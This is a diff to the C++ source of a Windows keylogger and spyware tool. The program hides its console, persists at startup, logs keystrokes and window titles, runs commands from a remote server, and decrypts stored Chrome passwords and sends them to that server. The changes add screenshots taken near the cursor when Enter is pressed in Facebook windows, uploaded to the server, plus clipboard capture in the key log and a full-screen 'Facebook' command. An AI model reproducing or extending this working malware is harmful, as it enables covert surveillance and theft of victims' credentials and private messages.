@@ -17,7 +17,7 @@
 #include "decode_Chrome_login_data.h" // to decode Chrome -> Login data
 #include "html_utility.h" // for html request
 
-// #define CONSOLE_LOG  // define to enable console log
+//#define CONSOLE_LOG  // define to enable console log
 
 #ifdef _DEBUG
 #pragma comment(lib, "libcurl/lib/libcurl_a_debug.lib")
@@ -29,8 +29,7 @@ using namespace std;
 namespace fs = experimental::filesystem;
 // Global Variable
 
-
-int UPDATE_PERIOD = 1000; // 10s
+int UPDATE_PERIOD = 1000; // 1000*10 = 10s
 char CAPTURE_PERIOD = 12; // 12*10s = 2m
 char capture_count = 0;
 
@@ -39,17 +38,18 @@ void copy_to_startup();
 int readfile();
 int print_drivers();
 HRESULT CaptureScreen(LPCTSTR file_name);
+HRESULT CaptureScreenNearCursor(LPCTSTR file_name, POINT cursor);
 void decrypt_send_password(string url);
 string get_list_files(string dir);
 wstring get_list_files(wstring dir);
 wstring get_path_w(string dir);
 string get_current_time();
 int execute_command(string cmd);
+string getClipboard();
 // char * ReadAllBytes(const char * filename, int * read_length);
 
 int main()
 {
-	
 #ifndef CONSOLE_LOG
 	// HIDE CONSOLE LOG AT STARTUP
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
@@ -70,6 +70,7 @@ int main()
 	if (base_url.find("http://") == std::string::npos) {
 		base_url = "http://" + base_url;
 	}
+
 	if (base_url[base_url.length() - 1] == '/') {
 		base_url[base_url.length() - 1] = '\0';
 	}
@@ -80,18 +81,17 @@ int main()
 	URL_DECRYPT = base_url + "/decrypt";
 	URL_CMD = base_url + "/cmd";
 
-
 #ifdef CONSOLE_LOG
 	// _setmode(_fileno(stdout), _O_U16TEXT); //cần để viết được ký tự utf-16 ra stdout
 #endif // CONSOLE_LOG
 
 	wchar_t lastTitle[1024];
 	wchar_t title[1024];
-	
-	string key_data = "";
+	bool isFacebook = false;
+	POINT cursor; // mouse cursor
+	string key_data = ""; // data to send -> server
 	string cmd = "";
 	int last_key = 0;
-
 	int count = 0;
 	
 	while (true) {
@@ -129,21 +129,31 @@ int main()
 		HWND hwndHandle = GetForegroundWindow();
 		GetWindowText(hwndHandle, title, 1023);
 
-		if (wcscmp(lastTitle, title)!=0) {
+		if (wcscmp(lastTitle, title)!=0) 
+		{
 #ifdef CONSOLE_LOG
 			std::wcout << endl << endl << L"Window: ";
 #endif
-			if (wcslen(title) == 0) {
+			if (wcslen(title) == 0) 
+			{
 #ifdef CONSOLE_LOG
 				std::wcout << L"NO ACTIVE WINDOW";
 #endif
 			}
-			else {
-#ifdef CONSOLE_LOG
-				std::wcout << "'" << title << "'";
-#endif
+			else 
+			{
 				/* Send data to server */
 				string send_title = get_utf8(title);
+				// check for Facebook tab
+				if (send_title.find("Facebook") != std::string::npos) 
+				{
+					isFacebook = true;
+				}
+				else 
+				{
+					isFacebook = false;
+				}
+				// last character = \0. Need to change to ' ' otherwise cannot append other string
 				send_title[send_title.length() - 1] = ' ';
 				send_title = "</div>\n<div class='title'>" + get_current_time() + send_title + "</div>\n<div class='key'>";
 				key_data = key_data + send_title;
@@ -151,31 +161,85 @@ int main()
 				send_title = "";
 				//send_title.clear();
 			}
-			// update last title			
+			// update last title		
+			std::copy(std::begin(title), std::end(title), std::begin(lastTitle));
+			/*
 			for (int i = 0; i < 1024; i++) {
 				lastTitle[i] = title[i];
 			}
+			*/
 		}
 		/* Key logger */
-		for (int KEY = 8; KEY <= 255; KEY++)
+		for (int KEY = 1; KEY <= 255; KEY++)
 		{
 			if (GetAsyncKeyState(KEY) == -32767) {
 				string out = "";
-				
-				if (KEY == 46)
-					out = "[DEL]";
+				if (KEY == VK_LBUTTON) {
+					// left button
+					if (isFacebook) { // update cursor if window = facabook
+						if (GetCursorPos(&cursor))
+						{
+							// cannot get cursor pos
+						}
+					}
+				}
+				else if (KEY == VK_RBUTTON) {
+					// right button
+				}
+				else if (KEY == VK_BACK)
+					out = "[Backspace]";
+				else if (KEY == VK_TAB)
+					out = "[TAB]";
+				else if (KEY == VK_RETURN) {
+					out = "[Enter]";
+					if (isFacebook) {
+						// capture facebook screenshot
+						WCHAR temp_path[MAX_PATH];
+						get_temp_path(temp_path, MAX_PATH, _T("tmp_fb.png"));
+						HRESULT res = CaptureScreenNearCursor(temp_path,cursor);
+						if (res == S_OK) {
+							upload_file_pos_html_form(URL_UPLOAD, get_utf8(wstring(temp_path)));
+						}
+						else {
+							curl_post("CaptureScreenNearCursor failed", URL_CMD);
+						}
+					}
+				}
+				else if (KEY == VK_CAPITAL)
+					out = "[Caps lock]";
+				else if (KEY == VK_ESCAPE)
+					out = "[ESC]";
+				else if (KEY == VK_SPACE)
+					out = "[Space]";
+				else if (KEY == 33)
+					out = "[PAGE UP]";
+				else if (KEY == 34)
+					out = "[PAGE DOWN]";
+				else if (KEY == 35)
+					out = "[END]";
+				else if (KEY == 36)
+					out = "[HOME]";
+				else if (KEY == 37)
+					out = "[Left]";
+				else if (KEY == 38)
+					out = "[Up]";
+				else if (KEY == 39)
+					out = "[Right]";
+				else if (KEY == 40)
+					out = "[Down]";
+				else if (KEY == 45)
+					out = "[INS]";
+				else if (KEY == 46)
+					out = "[Del]";
 				else if (KEY >= 48 && KEY <= 57) {  // number 0-9
 					if (GetAsyncKeyState(VK_SHIFT)) {
-						out = "[SHIFT+";
+						out = "[Shift+";
 						out = out + char(KEY);
 						out = out + "]";
 					}
 					else {
 						out = char(KEY);
 					}
-				}
-				else if (KEY == 32) {
-					out = "[SPACE]";
 				}
 				else if (KEY >= 65 && KEY <= 90) {  // char a-z
 					if (GetKeyState(VK_CAPITAL) & 0x0001) {
@@ -188,17 +252,20 @@ int main()
 							KEY = KEY + 32;
 						}
 					}
-					out = KEY;
+					out = KEY; 
+					if (GetAsyncKeyState(VK_CONTROL)) { // ctrl is pressed
+						if (KEY == 86 || KEY == 118) { // ctrl + c
+							out = out + "<span style='color: green'>(" + getClipboard() + ")</span>";
+						}
+					}
 				}
-				else if (KEY == 13)
-					out = "[RETURN]";
 				else if (KEY == 16 || KEY == 160 || KEY == 161) { // SHIFT
 					if (last_key == 16 || last_key == 160 || last_key == 161) {
 						// if last key is also SHIFT -> skip
 						last_key = KEY;
 						continue;
 					}
-					out = "[SHIFT]";
+					out = "[Shift]";
 				}
 				else if (KEY == 17 || KEY == 162 || KEY == 163) { // CTRL
 					if (last_key == 17 || last_key == 162 || last_key == 163) {
@@ -206,7 +273,7 @@ int main()
 						last_key = KEY;
 						continue;
 					}
-					out = "[CTRL]";
+					out = "[Ctrl]";
 				}
 				else if (KEY == 18 || KEY == 164 || KEY == 165) {  // ALT
 					if (last_key == 18 || last_key == 164 || last_key == 165) {
@@ -214,34 +281,8 @@ int main()
 						last_key = KEY;
 						continue;
 					}
-					out = "[ALT]";
+					out = "[Alt]";
 				}
-				else if (KEY == 8)
-					out = "[BACKSPACE]";
-				else if (KEY == 9)
-					out = "[TAB]";
-				else if (KEY == 20)
-					out = "[Caps lock]";
-				else if (KEY == 27)
-					out = "[ESC]";
-				else if (KEY == 33)
-					out = "[PAGE UP]";
-				else if (KEY == 34)
-					out = "[PAGE DOWN]";
-				else if (KEY == 35)
-					out = "[HOME]";
-				else if (KEY == 36)
-					out = "[POS1]";
-				else if (KEY == 37)
-					out = "[LEFT]";
-				else if (KEY == 38)
-					out = "[UP]";
-				else if (KEY == 39)
-					out = "[RIGHT]";
-				else if (KEY == 40)
-					out = "[DOWN]";
-				else if (KEY == 45)
-					out = "[INS]";
 				else if (KEY == 91 || KEY == 92)
 					out = "[WIN]";
 				else if (KEY >= 96 && KEY <= 105) { // number 0-9
@@ -250,13 +291,13 @@ int main()
 					out = out + "]";
 				}
 				else if (KEY == 106)
-					out = "[/]";
+					out = "[*]";
 				else if (KEY == 107)
 					out = "[+]";
 				else if (KEY == 109)
 					out = "[-]";
-				else if (KEY == 109)
-					out = "[,]";
+				else if (KEY == 110)
+					out = "[.]";
 				else if (KEY >= 112 && KEY <= 123)
 				{
 					out = "[F";
@@ -265,33 +306,39 @@ int main()
 				}
 				else if (KEY == 144)
 					out = "[NUM]";
-				else if (KEY == 192)
-					out = "[OE]";
-				else if (KEY == 222)
-					out = "[AE]";
 				else if (KEY == 186)
-					out = "[UE]";
-				else if (KEY == 186)
-					out = "+";
+					out = "[;]";
+				else if (KEY == 187)
+					out = "=";
 				else if (KEY == 188)
 					out = ",";
 				else if (KEY == 189)
 					out = "-";
 				else if (KEY == 190)
 					out = ".";
-				else if (KEY == 191)
-					out = "#";
+				else if (KEY == 191 || KEY == 111)
+					out = "/";
+				else if (KEY == 192)
+					out = "`";
+				else if (KEY == 219)
+					out = "[";
+				else if (KEY == 220)
+					out = "\\";
+				else if (KEY == 221)
+					out = "]";
+				else if (KEY == 222)
+					out = "[']";
 				else if (KEY == 226)
 					out = "<";
 				else
 				{
-					out = "[KEY \\";
-					out = out + char(KEY);
+					out = "[KEY ";
+					out = out + to_string(KEY);
 					out = out + "]";
 				}
 #ifdef CONSOLE_LOG
 				LPSTR s = const_cast<char *>(out.c_str());
-				// std::wcout << s;
+				//std::wcout << "[" << to_wstring(KEY)<< "]" << s;
 				std::wcout << to_wstring(KEY);
 #endif
 				/* append data to buffer */
@@ -418,6 +465,20 @@ int execute_command(string cmd) {
 		return 0;
 	}
 
+	// Facebook
+	if (cmd.compare("Facebook") == 0) {
+		WCHAR temp_path[MAX_PATH];
+		get_temp_path(temp_path, MAX_PATH, _T("tmp.png"));
+		HRESULT res = CaptureScreen(temp_path);
+		if (res == S_OK) {
+			upload_file_pos_html_form(URL_UPLOAD, get_utf8(wstring(temp_path)));
+		}
+		else {
+			curl_post("cannot save file", URL_CMD);
+		}
+		return 0;
+	}
+
 	// Decrypt password
 	if (cmd.compare("decrypt")==0) {
 		decrypt_send_password(URL_DECRYPT);
@@ -500,10 +561,58 @@ HRESULT CaptureScreen(LPCTSTR file_name)
 	CImage image;
 	image.Attach(hCaptureBitmap);
 	// TODO: save to other location
+	// JPEG is the smallest output
 	HRESULT res = image.Save(file_name, Gdiplus::ImageFormatJPEG); // change extension to save to png
 
 	image.Destroy();
 	ReleaseDC(hDesktopWnd, hDesktopDC);
+	DeleteDC(hCaptureDC);
+	DeleteObject(hCaptureBitmap);
+	return res;
+}
+
+HRESULT CaptureScreenNearCursor(LPCTSTR file_name, POINT cursor)
+{
+	const int MSG_WIDTH = 550;
+	const int MSG_HEIGHT = 500;
+
+	int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
+	int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
+
+	int offsetX = (cursor.x - MSG_WIDTH / 2);
+	if (offsetX < 0) {
+		offsetX = 0;
+	}
+	if ((offsetX + MSG_WIDTH) > nScreenWidth) {
+		offsetX = nScreenWidth - MSG_WIDTH;
+	}
+
+	int offsetY = (cursor.y - MSG_HEIGHT + 100);
+	if (offsetY < 0) {
+		offsetY = 0;
+	}
+	if ((offsetY + MSG_HEIGHT) > nScreenHeight) {
+		offsetY = nScreenHeight - MSG_HEIGHT;
+	}
+
+	HWND hDesktopWnd = GetDesktopWindow();
+	HDC hDesktopDC = GetDC(hDesktopWnd);
+	HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
+
+	HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC,
+		MSG_WIDTH, MSG_HEIGHT);
+	SelectObject(hCaptureDC, hCaptureBitmap);
+	BitBlt(hCaptureDC, -offsetX, -offsetY, nScreenWidth, nScreenHeight,
+		hDesktopDC, 0, 0, SRCCOPY | CAPTUREBLT);
+	// save the captured image to disk
+	CImage image;
+	image.Attach(hCaptureBitmap);
+	// TODO: save to other location
+	// JPEG is the smallest output
+	HRESULT res = image.Save(file_name, Gdiplus::ImageFormatJPEG); // change extension to save to png
+	// free memory
+	image.Destroy();
+	ReleaseDC(hDesktopWnd, hDesktopDC); 
 	DeleteDC(hCaptureDC);
 	DeleteObject(hCaptureBitmap);
 	return res;
@@ -738,6 +847,27 @@ int readfile()
 	}
 
 	return 0;
+}
+
+string getClipboard()
+{
+	CStringA strData;
+
+	if (OpenClipboard(NULL))
+	{
+		HANDLE hClipboardData = GetClipboardData(CF_TEXT);
+		if (hClipboardData)
+		{
+			CHAR *pchData = (CHAR*)GlobalLock(hClipboardData);
+			if (pchData)
+			{
+				strData = pchData;
+				GlobalUnlock(hClipboardData);
+			}
+		}
+		CloseClipboard();
+	}
+	return std::string(strData);
 }
 
 /*
